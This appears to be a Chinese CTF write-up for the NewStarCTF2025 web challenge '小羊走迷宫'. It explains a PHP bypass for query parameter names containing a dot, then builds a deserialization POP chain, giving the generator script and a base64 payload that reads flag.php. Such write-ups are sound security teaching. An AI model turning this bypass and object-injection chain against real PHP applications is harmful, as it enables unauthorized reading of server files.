---
title: 'NewStarCTF2025-Week4-Web 小羊走迷宫'
abbrlink: 98080ba6
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# NewStarCTF2025-Week4-Web 小羊走迷宫

题目：

![image-20260328192446163](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260328192446283.png)

## 1.对变量名的绕过

#### `ma_ze.path`不是合法变量名

`.`是非法的（在 PHP 语法中，`.` 是字符串连接符），而变量名只能包含字母、数字、下划线，且不能以数字开头。

当你写 `$ma.ze = 1;` 时，PHP 的代码解析器（Parser）在运行前就会报错。

#### 但是，数组下标可以是任何字符串

当你写 `$get['ma.ze'] = 1;` 时，这是完全合法的。

- **原因**：中括号 `[]` 内部的内容被视为一个 **String（字符串）**。
- **物理本质**：PHP 的数组底层是一个 **HashTable（哈希表）**。哈希表就像一个字典，它的“索引”可以是任何一段字符串。

#### 那我们就利用数组绕过

PHP 8.0 之前的一个 **解析 Bug**：

当你传 `?ma[ze.path=1` 时，按照 PHP 的解析逻辑，`[` 之后的内容是**‘数组内部的键名’**。所以就不会检查后面的`ze.path`

但是也会**把参数名里所有不符合变量规范的字符（点、空格）都强行换成下划线。**因此`[`变成了`_



### 2.写脚本:

题目代码：

```

<?php
include "flag.php";
error_reporting(0);
class startPoint{
    public $direction;
    function __wakeup(){
        echo "gogogo出发咯 ";
        $way = $this->direction;
        return $way();	//当way是一个类时，会调用__invoke()-------------直接startPoint.direction=SaySomething
    }
}
class Treasure{
    protected $door;
    protected $chest;
    function __get($arg){	
        echo "拿到钥匙咯，开门！ ";
        $this -> door -> open();	//open?没这个函数啊，door=endPoint那就会调用__call
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this -> chest -> key;//key？根本没有这个属性，chest=Treasure那么就调用了__get($arg)
    }
}
class SaySomething{
    public $sth;
    function __invoke()	
    {
        echo "说点什么呢 ";
        return "说： ".$this->sth;//多明显的字符串拼接，让SaySomething.sth=Treasure对象，直接调用了__toString()
    }
}
class endPoint{
    private $path;
    function __call($arg1,$arg2){
        echo "到达终点！现在尝试获取flag吧"."<br>";
        echo file_get_contents($this->path);	//__call被调用，那就直接传参path=flag.php
    }
}

if ($_GET["ma_ze.path"]){
    unserialize(base64_decode($_GET["ma_ze.path"]));	//那么我们的目标肯定是希望unserialize被调用，然后传参我们的逻辑链条，但是与此同时，__wakeup()就被调用了
}else{
    echo "这个变量名有点奇怪，要怎么传参呢？";
}
?>  
```

php脚本：

```
<?php
class startPoint {
    public $direction;
}

class SaySomething {
    public $sth;
}

class Treasure {
    public $door;
    public $chest;
}

class endPoint {
    public $path = "flag.php";
}



$e = new endPoint();
$t = new Treasure();
$a = new startPoint();
$s = new SaySomething();

$t->door = $e;     
$t->chest = $t;    
$s->sth = $t;       
$a->direction = $s; 

$payload = serialize($a);
echo "原始序列化数据: " . $payload . "\n";
echo "Base64 编码结果: " . base64_encode($payload) . "\n";
?>
```

payload：

```
?ma[ze.path=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NDoiZG9vciI7Tzo4OiJlbmRQb2ludCI6MTp7czo0OiJwYXRoIjtzOjg6ImZsYWcucGhwIjt9czo1OiJjaGVzdCI7cjozO319fQ==
```

得到

![image-20260325203828454](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260325203828569.png)